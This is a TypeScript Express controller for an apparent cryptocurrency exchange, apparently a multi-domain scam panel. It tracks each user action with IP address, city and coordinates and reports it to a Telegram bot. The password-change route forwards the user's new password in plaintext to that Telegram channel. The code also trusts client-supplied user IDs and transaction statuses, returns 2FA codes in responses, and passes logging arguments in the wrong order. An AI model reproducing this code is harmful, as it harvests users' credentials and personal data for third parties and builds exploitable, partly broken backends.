import * as express from 'express'
// import { validationResult } from 'express-validator'
// import ApiError from '../exeptions/api_error'
import UserServices from '../services/user_services'
import telegram from '../api/telegram_api'
import codeGenerator from '../api/password_generator'
import auth_services from '../services/auth_services'
import PROFILE_DATA from 'interface/profile_user.interface'
import USE_PROMO_IN_PROFILE from 'interface/profile_promo_usage.interface'
import TWO_STEP_ENABLE from 'interface/two_step_enable.interface'
import UPDATE_2FA_STATUS from 'interface/update_2fa_status.interface'
import KYC_DATA from 'interface/kyc.interface'
import DEPOSIT_HISTORY from 'interface/deposit_history.interface'
import WITHDRAWAL_HISTORY from 'interface/withdrawal_history.interface'
import SWAP_HISTORY from 'interface/swap_history.interface'
import INTERNAL_HISTORY from 'interface/internal_history.interface'

async function saveUserLogs(email: string, ipAddress: string, city: string, countryName: string, coordinates: string, browser: string, currentDate: string, userAction: string, userDomain: string) {

  const userLogs: any = await UserServices.saveUserLogs(email, ipAddress, city, countryName, coordinates, browser, currentDate, userAction, userDomain)
  if (userLogs) {
    console.log('result from save logs func is : ', userLogs)
    return { status: 'logs was received.' }
  }
  return { status: 'logs was rejected' }
}

class UserController {

  async dashboard(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // get user id & => 
      // get total balance & currency balances 
      const { id, email, ipAddress, city, browser, countryName, coordinates, currentDate, userAction, domainName } = req.body
      console.log(req.body)
      const user: any = await UserServices.dashboard(id)
      console.log('found user is: ', user)

      if (user.hasOwnProperty('withoutLogs') && user.withoutLogs === true) {
        return res.status(200).json({ user: user })
      }

      await saveUserLogs(email, ipAddress, city, browser, countryName, coordinates, currentDate, 'перешел на dashboard', domainName)
      await telegram.sendMessageByUserActions(email, ' перешел на dashboard ', domainName)

      return res.status(200).json({ user: user })
    } catch (e) {
      next(e)
    }
  }

  async personalAreaProfile(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transfer_object: PROFILE_DATA = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      ipAddress: req.body.ipAddress,
      city: req.body.city,
      browser: req.body.browser,
      countryName: req.body.countryName,
      coordinates: req.body.coordinates,
      currentDate: req.body.currentDate,
      userAction: req.body.userAction,
      domainName: req.body.domainName
    }
    try {
      console.log('req body: ', req.body);

      const user: any = await UserServices.personalAreaProfile(transfer_object.userId)
      console.log('found user is: ', user)

      if (!user) return res.status(400).json({ user: 'not found', message: 'rejected' })

      if (user.hasOwnProperty('withoutLogs') && user.withoutLogs === true) return res.status(200).json({ user: user, message: 'complete' })

      await saveUserLogs(transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.browser, transfer_object.currentDate, `перешел на ${transfer_object.userAction} `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` перешел на ${transfer_object.userAction}`, transfer_object.domainName)
      return res.status(200).json({ user: user, message: 'OK' })

    } catch (e) {
      next(e)
    }
  }

  async usePromocodeInProfile(req: express.Request, res: express.Response, next: express.NextFunction) {

    console.log('req body: ', req.body);

    const transfer_object: USE_PROMO_IN_PROFILE = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      ipAddress: req.body.ipAddress,
      city: req.body.city,
      browser: req.body.browser,
      countryName: req.body.countryName,
      coordinates: req.body.coordinates,
      currentDate: req.body.currentDate,
      userAction: req.body.userAction,
      domainName: req.body.domainName,
      promocode: req.body.code
    }
    try {
      const result: any = await UserServices.UsePromocodeInProfile(transfer_object.promocode)
      if (result === false) return res.status(400).json({ message: 'wrong data' })

      const rebasePromo: boolean = await auth_services.rebasePromocodeToUsed(transfer_object.promocode, transfer_object.userEmail)
      if (!rebasePromo) return res.status(500).json({ message: 'internal server error' })
      await saveUserLogs(transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.browser, transfer_object.currentDate, ` использовал промокод ${transfer_object.promocode} на `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` использовал промокод ${transfer_object.promocode} `, transfer_object.domainName)
      return res.status(200).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  // async personalAreaProfileEdit(req: express.Request, res: express.Response, next: express.NextFunction) {
  //   try {
  //     const { userId, userName, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
  //     console.log('req body: ', req.body);

  //     if (!userName && !userId) return res.status(400).json({ message: 'wrong data' })
  //     const result: boolean = await UserServices.changeNameInProfile(userId, userName)
  //     if (!result) return res.status(400).json({ message: 'can`t find any user' })

  //     await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, ` поменял имя на ${userName} `, domainName)
  //     await telegram.sendMessageByUserActions(userEmail, ` поменял имя на ${userName} `, domainName)
  //     return res.status(200).json({ message: 'OK' })

  //   } catch (e) {
  //     next(e)
  //   }
  // }

  async twoStepVerificationEnable(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      const code: string = await codeGenerator(8)
      console.log('generated code is: ', code);

      const transferObject: TWO_STEP_ENABLE = {
        twoFaType: req.body.twoFaType,
        twoFaStatus: req.body.twoFaStatus,
        domainName: req.body.domainName,
        userId: req.body.userId,
        userEmail: req.body.userEmail,
        currentTime: req.body.currentTime,
        code: code
      }
      const result: any = await UserServices.enableTwoStepVerification(transferObject)
      if (!result) return res.status(400).json({ message: 'wrong data' })

      return res.status(202).json({ message: '2fa was enabled', userCode: code })
    } catch (e) {
      next(e)
    }
  }

  async enableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      const transferObject: UPDATE_2FA_STATUS = {
        twoFaType: req.body.twoFaType,
        userId: req.body.userId,
        userEmail: req.body.userEmail,
        domainName: req.body.domainName,
        twoFaStatus: req.body.twoFaStatus,
        enableDate: req.body.enableDate
      }

      const result: boolean = await UserServices.enableTwoStepVerificationStatus(transferObject)
      if (!result) return res.status(400).json({ message: 'wrong data' })

      return res.status(200).json({ message: '2fa turned on' })
    } catch (e) {
      next(e)
    }
  }

  // async deleteExpiredCode(req: express.Request, res: express.Response, next: express.NextFunction) {
  //   try {
  //     const code: string = req.body.code
  //     console.log('req body: ', req.body);
  //     if (!code) return res.status(400).json({ message: 'rejected' })
  //     const result: boolean = await UserServices.deleteExpiredCode(code)
  //     if (!result) return res.status(500).json({ message: 'internal server error' })

  //     return res.status(200).json({ message: 'OK' })
  //   } catch (e) {
  //     next(e)
  //   }
  // }


  async disableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      const { userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName } = req.body
      console.log('req body: ', req.body);

      const result: boolean = await UserServices.disableUserTwoStep(userId)
      if (!result) return res.status(400).json({ message: 'rejected' })

      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, ` выключил 2фа аутентификацию на`, domainName)
      await telegram.sendMessageByUserActions(userEmail, ` выключил 2фа аутентификацию `, domainName)
      return res.status(200).json({ message: '2fa turned off' })

    } catch (e) {
      next(e)
    }
  }

  async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
    const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
    console.log('req body is: ', req.body)

    try {
      const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
      if (!result) return res.status(400).json({ message: 'rejected' })

      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на `, domainName)
      await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
      console.log('operation status: ', result)
      return res.status(200).json({ message: 'OK' })

    } catch (e) {
      next(e)
    }
  }

  async personalAreaKyc(req: express.Request, res: express.Response, next: express.NextFunction) {

    console.log('req body kyc: ', req.body);

    const transfer_object: KYC_DATA = {
      userId: req.body.id,
      userEmail: req.body.email,
      firstName: req.body.firstName,
      lastName: req.body.lastName,
      phoneNumber: req.body.phoneNumber,
      dateOfBirth: req.body.dateOfBirth,
      documentNumber: req.body.documentNumber,
      mainAddress: req.body.mainAddress,
      zipCode: req.body.zipCode,
      documentType: req.body.documentType,
      ipAddress: req.body.ipAddress,
      state: req.body.state,
      city: req.body.city,
      browser: req.body.browser,
      subAddress: req.body.subAddress,
      countryName: req.body.countryName,
      coordinates: req.body.coordinates,
      currentDate: req.body.currentDate,
      userAction: req.body.userAction,
      domainName: req.body.domainName,
      kycStatus: 'pending'
    }

    try {
      const result: boolean = await UserServices.personalAreaSendKyc(transfer_object)
      console.log('operation result is: ', result)

      if (!result) return res.status(400).json({ message: 'kyc already added' })

      await saveUserLogs(transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.browser, transfer_object.currentDate, ' отправил KYC ', transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ' отправил KYC ', transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }


  async makeDeposit(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req body is: ', req.body)

    const transfer_object: DEPOSIT_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      coinName: req.body.coinName,
      amountInCrypto: req.body.amountInCrypto,
      amountInUsd: req.body.amountInUsd,
      currentDate: req.body.currentDate,
      depositAddress: req.body.depositAddress,
      depositStatus: req.body.depositStatus
    }

    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates

    try {
      const result: boolean = await UserServices.MakeDeposit(transfer_object)
      console.log('operation result is: ', result)

      if (!result) return res.status(400).json({ message: 'wrong data' })

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, transfer_object.currentDate, ` создал заявку на депозит на сумму ${transfer_object.amountInCrypto} ( ${transfer_object.amountInUsd} ) ${transfer_object.coinName} `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на депозит на сумму ${transfer_object.amountInCrypto} ( ${transfer_object.amountInUsd} ) ${transfer_object.coinName} `, transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async getDepositHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req body is: ', req.body)
    const userId: string = req.body.userId

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetDepositHistory(userId)
      console.log(' result is: ', result)
      if (!result) return res.status(500).json({ message: 'internal server error' })

      return res.status(200).json({ message: 'ok', depositHistory: result })

    } catch (e) {
      next(e)
    }
  }

  async makeWithdrawal(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req body is: ', req.body)

    const transfer_object: WITHDRAWAL_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      coinName: req.body.coinName,
      amountInCrypto: req.body.amountInCrypto,
      amountInUsd: req.body.amountInUsd,
      currentDate: req.body.currentDate,
      withdrawalAddress: req.body.withdrawalAddress,
      withdrawalStatus: req.body.withdrawalStatus
    }
    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates

    try {
      const result: boolean = await UserServices.MakeWithdrawal(transfer_object)
      console.log('result is: ', result)
      if (!result) return res.status(400).json({ message: 'wrong data' })

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, transfer_object.currentDate, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ( ${transfer_object.amountInUsd} ) ${transfer_object.coinName} `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ( ${transfer_object.amountInUsd} ) ${transfer_object.coinName} `, transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async getWithdrawalHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.body.id
    console.log('int id is: ', userId)

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetWithdrawalHistory(userId)
      console.log(' result is: ', result)
      if (!result) return res.status(500).json({ message: 'internal server error' })

      return res.status(200).json({ message: 'ok', withdrawHistory: result })
    } catch (e) {
      next(e)
    }
  }

  async makeSwap(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req body is: ', req.body)

    const transfer_object: SWAP_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      coinNameFrom: req.body.coinNameFrom,
      coinNameTo: req.body.coinNameTo,
      amountInCryptoFrom: req.body.amountInCryptoFrom,
      amountInCryptoTo: req.body.amountInCryptoTo,
      amountInUsdFrom: req.body.amountInUsdFrom,
      amountInUsdTo: req.body.amountInUsdTo,
      currentDate: req.body.currentDate,
      swapStatus: req.body.swapStatus
    }

    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates

    try {
      const result: boolean = await UserServices.MakeSwap(transfer_object)
      console.log('result is: ', result)

      if (!result) return res.status(400).json({ message: 'wrong data' })

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, transfer_object.currentDate, ` сделал свап c ${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo}  ${transfer_object.coinNameTo} на `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` сделал свап c ${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo}  ${transfer_object.coinNameTo} `, transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async getSwapHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.body.userId
    console.log('int id is: ', userId)

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetSwapHistory(userId)
      console.log(' result is: ', result)
      if (!result) return res.status(500).json({ message: 'internal server error' })

      return res.status(200).json({ message: 'ok', swapHistory: result })
    } catch (e) {
      next(e)
    }
  }


  async makeInternalTransfer(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req body is: ', req.body)

    const transfer_object: INTERNAL_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      secondPartyEmail: req.body.secondPartyEmail,
      domainName: req.body.domainName,
      coinName: req.body.coinName,
      amountInCrypto: req.body.amountInCrypto,
      amountInUsd: req.body.amountInUsd,
      currentDate: req.body.currentDate,
      fromAddress: req.body.fromAddress,
      toAddress: req.body.toAddress,
      transferType: req.body.transferType,
      transferStatus: req.body.transferStatus,
    }

    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates

    try {
      const result: boolean = await UserServices.MakeInternalTransfer(transfer_object)
      console.log('result is: ', result)

      if (!result) return res.status(400).json({ message: 'wrong data' })

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, transfer_object.currentDate, ` совершил внутренний перевод пользователю ${transfer_object.secondPartyEmail} на сумму  ${transfer_object.amountInCrypto}  ${transfer_object.coinName} на `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` совершил внутренний перевод пользователю ${transfer_object.secondPartyEmail} на сумму  ${transfer_object.amountInCrypto}  ${transfer_object.coinName} `, transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async getInternalTransferHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.body.userId
    console.log('int id is: ', userId)

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetInternalTransferHistory(userId)
      console.log(' result is: ', result)
      if (!result) return res.status(500).json({ message: 'internal server error' })

      return res.status(200).json({ message: 'ok', internalTransferHistory: result })
    } catch (e) {
      next(e)
    }
  }

  async support(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // chat with support
    } catch (e) {
      next(e)
    }
  }

  // async wallet(req: express.Request, res: express.Response, next: express.NextFunction) {
  //   try {

  //   } catch (e) {
  //     next(e)
  //   }
  // }

  async secureDeal(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // secure deal form & history
    } catch (e) {
      next(e)
    }
  }

  async getSecureDealDetail(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // current secure deal info & support chat
    } catch (e) {
      next(e)
    }
  }

  async acceptDeal(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // accept deal as buyer
    } catch (e) {
      next(e)
    }
  }

}

export default new UserController()